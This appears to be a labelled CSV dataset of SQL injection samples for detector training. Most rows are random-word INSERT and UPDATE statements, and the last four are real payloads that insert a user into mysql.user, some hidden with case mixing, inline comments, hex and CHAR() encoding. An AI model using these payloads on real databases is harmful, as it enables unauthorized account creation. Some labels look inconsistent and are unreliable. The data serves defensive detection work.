payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"INSERT INTO voice ( whatever, combine, direct, this, select, mine ) VALUES ( 'widely', 'storm'. child', 'football', 'sun', 'bent', 'scale' )",second_order,unknown,case_variation,0.8,rule,sqliv3_csv,insert
"INSERT INTO paper ( plant, potatoes, powder ) VALUES ( 'willing', 'stood', 'ice' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"UPDATE steady SET palace = 'exercise', City = 'trick' WHERE cast = probably",second_order,unknown,,0.8,rule,sqliv3_csv,update
UPDATE riding SET piano = 'perfectly'WHERE peace = 'such',second_order,unknown,,0.8,rule,sqliv3_csv,update
"INSERT INTO party ( effect, share, system, wet, east, blood ) VALUES ( 'eaten', 'canal'. wood', 'agree', 'dirty', 'tent', 'drink' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"INSERT INTO victory ( bowl, bad, night ) VALUES ( 'brass', 'damage', 'slipped' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"UPDATE shade SET scene = 'failed', City = 'herself' WHERE fastened = fear",second_order,unknown,,0.8,rule,sqliv3_csv,update
UPDATE refused SET dance = 'job'WHERE worth = 'sister',second_order,unknown,,0.8,rule,sqliv3_csv,update
"INSERT INTO naturally ( stretch, foreign, found, beside, experience, push ) VALUES ( 'saw', 'finest'. globe', 'older', 'former', 'record', 'boy' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"INSERT INTO account ( metal, dozen, courage ) VALUES ( 'now', 'explanation', 'plural' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"UPDATE species SET frog = 'safe', City = 'movie' WHERE flower = scientist",second_order,unknown,,0.8,rule,sqliv3_csv,update
UPDATE moment SET sell = 'lay'WHERE trick = 'managed',second_order,unknown,,0.8,rule,sqliv3_csv,update
"INSERT INTO saw ( knowledge, at, manufacturing, stream, me, melted ) VALUES ( 'century', 'salmon'. old', 'move', 'line', 'open', 'wood' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"INSERT INTO library ( give, adventure, lips ) VALUES ( 'could', 'happened', 'reason' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"UPDATE road SET separate = 'particular', City = 'freedom' WHERE chapter = favorite",second_order,unknown,,0.8,rule,sqliv3_csv,update
UPDATE quick SET planning = 'under'WHERE another = 'of',second_order,unknown,,0.8,rule,sqliv3_csv,update
"INSERT INTO thirty ( stems, prepare, sure, lovely, surface, food ) VALUES ( 'cap', 'view'. official', 'learn', 'buffalo', 'giant', 'fish' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"INSERT INTO trip ( slight, organized, duck ) VALUES ( 'made', 'previous', 'gather' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"UPDATE bent SET compare = 'arrive', City = 'provide' WHERE chart = spin",second_order,unknown,,0.8,rule,sqliv3_csv,update
UPDATE everybody SET wise = 'rapidly'WHERE discover = 'pattern',second_order,unknown,,0.8,rule,sqliv3_csv,update
"INSERT INTO vote ( frame, more, from, date, simple, children ) VALUES ( 'stand', 'love'. upon', 'mill', 'if', 'system', 'deep' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"INSERT INTO arrow ( instant, expression, lungs ) VALUES ( 'thin', 'mixture', 'former' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"UPDATE hat SET fuel = 'meat', City = 'differ' WHERE signal = root",second_order,unknown,,0.8,rule,sqliv3_csv,update
UPDATE visit SET differ = 'wash'WHERE drive = 'goes',second_order,unknown,,0.8,rule,sqliv3_csv,update
"INSERT INTO nice ( plan, soft, paint, continent, appearance, handsome ) VALUES ( 'sink', 'win'. ask', 'twice', 'importance', 'foreign', 'in' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"INSERT INTO bee ( related, return, either ) VALUES ( 'wear', 'matter', 'blue' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"UPDATE brought SET again = 'center', City = 'father' WHERE tongue = grown",second_order,unknown,,0.8,rule,sqliv3_csv,update
UPDATE alphabet SET colony = 'cutting'WHERE taken = 'stems',second_order,unknown,,0.8,rule,sqliv3_csv,update
"INSERT INTO poetry ( fall, practice, every, element, next, shown ) VALUES ( 'example', 'room'. friend', 'aboard', 'expression', 'hat', 'engine' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"INSERT INTO high ( straw, fire, spring ) VALUES ( 'amount', 'tried', 'boy' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"UPDATE gun SET hungry = 'chair', City = 'screen' WHERE slow = melted",second_order,unknown,,0.8,rule,sqliv3_csv,update
UPDATE teacher SET occasionally = 'move'WHERE conversation = 'deer',second_order,unknown,,0.8,rule,sqliv3_csv,update
"INSERT INTO sudden ( anybody, turn, faster, replace, tune, rose ) VALUES ( 'coast', 'seven'. wear', 'basket', 'gave', 'count', 'worry' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"INSERT INTO highway ( cheese, age, pale ) VALUES ( 'gun', 'mix', 'fast' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"UPDATE bark SET few = 'vapor', City = 'subject' WHERE alphabet = pretty",second_order,unknown,,0.8,rule,sqliv3_csv,update
UPDATE vapor SET alone = 'how'WHERE gate = 'acres',second_order,unknown,,0.8,rule,sqliv3_csv,update
"INSERT INTO truck ( laid, map, divide, unknown, trail, blood ) VALUES ( 'seeing', 'activity'. zebra', 'stiff', 'remember', 'fierce', 'at' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"INSERT INTO stronger ( coming, still, correctly ) VALUES ( 'jack', 'worse', 'egg' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"UPDATE chart SET pleasant = 'diameter', City = 'post' WHERE get = diagram",second_order,unknown,,0.8,rule,sqliv3_csv,update
UPDATE tight SET several = 'pattern'WHERE goose = 'reach',second_order,unknown,,0.8,rule,sqliv3_csv,update
"INSERT INTO remove ( scale, facing, troops, select, he, grabbed ) VALUES ( 'press', 'wind'. space', 'slow', 'alone', 'throughout', 'visit' )",second_order,unknown,case_variation,0.8,rule,sqliv3_csv,insert
"INSERT INTO careful ( dropped, extra, thirty ) VALUES ( 'length', 'were', 'been' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"UPDATE location SET couple = 'line', City = 'key' WHERE belt = village",second_order,unknown,,0.8,rule,sqliv3_csv,update
UPDATE salt SET did = 'garden'WHERE orange = 'exclaimed',second_order,unknown,,0.8,rule,sqliv3_csv,update
"INSERT INTO usually ( living, everything, story, opinion, tape, scientific ) VALUES ( 'chain', 'journey'. deer', 'frozen', 'shallow', 'shake', 'age' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"INSERT INTO total ( replied, job, settlers ) VALUES ( 'fastened', 'scale', 'pond' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"UPDATE fair SET those = 'wore', City = 'ship' WHERE weak = possibly",second_order,unknown,,0.8,rule,sqliv3_csv,update
UPDATE adult SET honor = 'gain'WHERE chicken = 'paragraph',second_order,unknown,,0.8,rule,sqliv3_csv,update
"INSERT INTO large ( paid, ride, clothes, success, minute, porch ) VALUES ( 'word', 'had'. nose', 'cold', 'way', 'pencil', 'coat' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"INSERT INTO six ( solid, automobile, wore ) VALUES ( 'hope', 'leather', 'smallest' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"UPDATE shorter SET am = 'forgot', City = 'mysterious' WHERE height = away",second_order,unknown,,0.8,rule,sqliv3_csv,update
UPDATE now SET kind = 'avoid'WHERE lot = 'his',second_order,unknown,,0.8,rule,sqliv3_csv,update
"INSERT INTO youth ( give, freedom, chosen, heavy, buried, how ) VALUES ( 'blanket', 'satisfied'. whatever', 'half', 'yellow', 'exciting', 'signal' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"INSERT INTO watch ( help, gas, excellent ) VALUES ( 'among', 'than', 'skill' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"UPDATE to SET born = 'lion', City = 'belt' WHERE range = rising",second_order,unknown,,0.8,rule,sqliv3_csv,update
UPDATE wave SET load = 'speak'WHERE carry = 'probably',second_order,unknown,,0.8,rule,sqliv3_csv,update
"INSERT INTO chair ( answer, action, pictured, disease, end, screen ) VALUES ( 'scene', 'idea'. likely', 'made', 'donkey', 'land', 'atomic' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"INSERT INTO boy ( goose, offer, slabs ) VALUES ( 'particularly', 'course', 'exact' )",second_order,unknown,,0.8,rule,sqliv3_csv,insert
"UPDATE won SET known = 'prepare', City = 'far' WHERE dust = terrible",second_order,unknown,,0.8,rule,sqliv3_csv,update
UPDATE motor SET traffic = 'tobacco'WHERE east = 'species',second_order,unknown,,0.8,rule,sqliv3_csv,update
"iNsErT IntO mYsQl.usEr /*vmKx^e*/ ( useR, hoST, paSsw:or d ) vALUES ( ;'NaMe', 'lOcalHosT', pAssWOrD (/*$kok!p*/ 'pASs3X0b0B10b0B11111011100e'; <)_#like )",second_order,unknown,comment_whitespace|inline_comment,0.8,rule,sqliv5_json,insert
"INsErt iNtO!MYsql.USEr_ ( user, hoST, PAssW+ or d%^) ~vAlUeS/*(4fSfF<Dti|:Y%?*/ -( -'NamE', 'LOCalHOst', PASsw or d ( 'pASs0X5o0o0b0B0x0B8B0B1010110101111001011010100001010000001111110001110110001000011101011' ) ) `",second_order,unknown,comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,insert
"iNSert INTO UsERs/ (: lOGIN, pAsswORd, lEveL ) &VaLUEs ( CHAR ( 0X70 ); +]ChaR? ({ 0X0o43 ) + cHAr[~([ 2x44 [) + Char ( 0b0x0B0O2x15& )$ + ChaR ( 0X72 ) +.CHAr, ( +0x0XA ) + cHAR> (: 0x65/*;QwTd`(SElect (SelEcT (SElECT (SeLect (SEleCt (SeLEct 0X3))))))D*/ ) + ChAr '( 0x0x4a ) + chaR (} 0x0O131 ) +;Char` ( 0X72 ) ,ChaR (/ 0x64 /*(sELEct 0o0x3o0x4);h0X0x6_UYuxVi~Hiuo_O88N&ozCkr{\CKc!x5/(SELECT 7)%i*/)",second_order,unknown,case_variation|comment_whitespace|inline_comment,0.8,rule,sqliv5_json,insert
"' insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123')) --",second_order,mssql,,0.7,rule,seclists,insert
